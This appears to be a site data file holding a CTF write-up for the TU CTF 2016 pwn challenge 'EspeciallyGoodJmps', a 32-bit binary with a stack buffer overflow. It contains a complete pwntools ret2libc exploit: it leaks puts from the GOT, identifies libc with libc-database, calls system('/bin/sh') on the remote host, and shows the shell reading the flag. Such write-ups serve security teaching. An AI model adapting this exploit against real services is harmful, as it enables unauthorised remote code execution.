{"componentChunkName":"component---src-templates-writeup-js","path":"/writeups/tu-ctf-2016/pwn/especiallygoodjmps/sudhackar","result":{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2016\"></a>\n<a href=\"type=exploit\"></a>\n[](tags=buffer overflow)\n<a href=\"tools=libc-database\"></a>\n<a href=\"techniques=ret2libc\"></a></p>\n<h1>EspeciallyGoodJmps (pwn-75)</h1>\n<h3>Description</h3>\n<blockquote>\n<p>Pop a shell.</p>\n</blockquote>\n<blockquote>\n<p>Binary is hosted at: 130.211.202.98:7575</p>\n</blockquote>\n<blockquote>\n<p>EDIT:</p>\n</blockquote>\n<blockquote>\n<p>ASLR is enabled on remote server.</p>\n</blockquote>\n<pre><code class=\"language-bash\">$ file 23e4f31a5a8801a554e1066e26eb34745786f4c4\n23e4f31a5a8801a554e1066e26eb34745786f4c4: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped\n</code></pre>\n<pre><code class=\"language-bash\">$ checksec --file 23e4f31a5a8801a554e1066e26eb34745786f4c4\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   23e4f31a5a8801a554e1066e26eb34745786f4c4\n</code></pre>\n<p>Running the program in gdb shows that basic buffer overflow is there.</p>\n<pre><code class=\"language-bash\">gdb-peda$ r\nStarting program: /tmp/23e4f31a5a8801a554e1066e26eb34745786f4c4\nWhat's your name?\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nWhat's your favorite number?\n1\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, 1 is an odd number!\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x0\nEBX: 0xf7fa6000 --> 0x1a8da8\nECX: 0xf7fa7878 --> 0x0\nEDX: 0x0\nESI: 0x0\nEDI: 0x0\nEBP: 0x41414141 ('AAAA')\nESP: 0xffffd490 ('A' &#x3C;repeats 39 times>)\nEIP: 0x41414141 ('AAAA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414141\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd490 ('A' &#x3C;repeats 39 times>)\n0004| 0xffffd494 ('A' &#x3C;repeats 35 times>)\n0008| 0xffffd498 ('A' &#x3C;repeats 31 times>)\n0012| 0xffffd49c ('A' &#x3C;repeats 27 times>)\n0016| 0xffffd4a0 ('A' &#x3C;repeats 23 times>)\n0020| 0xffffd4a4 ('A' &#x3C;repeats 19 times>)\n0024| 0xffffd4a8 ('A' &#x3C;repeats 15 times>)\n0028| 0xffffd4ac ('A' &#x3C;repeats 11 times>)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414141 in ?? ()\n</code></pre>\n<p>So yeah overflow the buffer into saved eip and get a shell from shellcode as no NX means we can keep shellcode on the stack.</p>\n<p>But ASLR is enabled, so locating shellcode on the stack might be a pain. There are many approches to pwn it, mine was rather complicated than other exploits I saw after the CTF.</p>\n<p>So, first leak an address from libc by reading GOT entry for puts() i.e. call puts(GOT[puts]).Once I have a libc's leaked address I'll find the version using <a href=\"https://github.com/niklasb/libc-database\">libc-database</a>. <a href=\"https://github.com/niklasb/libc-database\">libc-database</a> can find versions of libc just by the LSB of the leak. We find by the leak that its LSB is 0xc10.</p>\n<pre><code class=\"language-bash\">$ ./find puts c10\nubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.6_amd64)\nubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.7_amd64)\n$ ./dump libc6-i386_2.19-0ubuntu6.7_amd64\noffset___libc_start_main_ret = 0x19a63\noffset_system = 0x0003fcd0\noffset_dup2 = 0x000d9dd0\noffset_read = 0x000d9490\noffset_write = 0x000d9510\noffset_str_bin_sh = 0x15da84\n$ ./dump libc6-i386_2.19-0ubuntu6.6_amd64\noffset___libc_start_main_ret = 0x19a63\noffset_system = 0x0003fcd0\noffset_dup2 = 0x000d9dd0\noffset_read = 0x000d9490\noffset_write = 0x000d9510\noffset_str_bin_sh = 0x15da84\n</code></pre>\n<p>So we have 2 candidates and both have same offsets. Now we can easily calculate the offsets for system() and \"/bin/sh\" in libc once we have leaked address from GOT[puts]</p>\n<p>First I leak libc's address and then redirect the flow to main() to get control after the leak.\nThen I call system(\"/bin/sh\") using the libc's version and leaked address.</p>\n<p><a href=\"/c3d92322d37d78ef0156944fce2fab93/23e4f31a5a8801a554e1066e26eb34745786f4c4.py\">the exploit</a></p>\n<pre><code class=\"language-python\">from pwn import *\n\noffset___libc_start_main_ret = 0x19a63\noffset_system = 0x0003fcd0\noffset_dup2 = 0x000d9dd0\noffset_read = 0x000d9490\noffset_write = 0x000d9510\noffset_str_bin_sh = 0x15da84\noffset_puts = 0x64c10\n\ngot_puts = 0x804a018\n'''$ readelf -r ./23e4f31a5a8801a554e1066e26eb34745786f4c4 | grep puts\n0804a018  00000407 R_386_JUMP_SLOT   00000000   puts'''\n\n\naddr_main = 0x804851d\n\npop_ret = 0x0804839d\n\npad = 'A'*44\n\npayload = pad + p32(0x080483e6) + p32(pop_ret) + p32(got_puts) + p32(addr_main) + p32(addr_main)\ns = remote('130.211.202.98',7575)\n\ns.recvline()\ns.sendline(payload)\n\ns.recvline()\ns.send(\"1\\n\")\ns.recvline()\n\nt=s.recv(4)\nputs_leak=u32(t)\ns.recvline()\n\n\npayload1 = pad + p32(puts_leak - offset_puts + offset_system) + p32(pop_ret) + p32(puts_leak - offset_puts + offset_str_bin_sh)\n\ns.sendline(payload1)\ns.interactive()\n</code></pre>\n<p>gives us</p>\n<pre><code class=\"language-bash\">[+] Opening connection to 130.211.202.98 on port 7575: Done\n\n[*] Switching to interactive mode\n$ ls\neasy\nflag.txt\n$ cat flag.txt\nTUCTF{th0se_were_s0me_ESPecially_good_JMPs}\n</code></pre>","relativePath":"writeups/tu-ctf-2016/pwn/especiallygoodjmps/sudhackar"}}}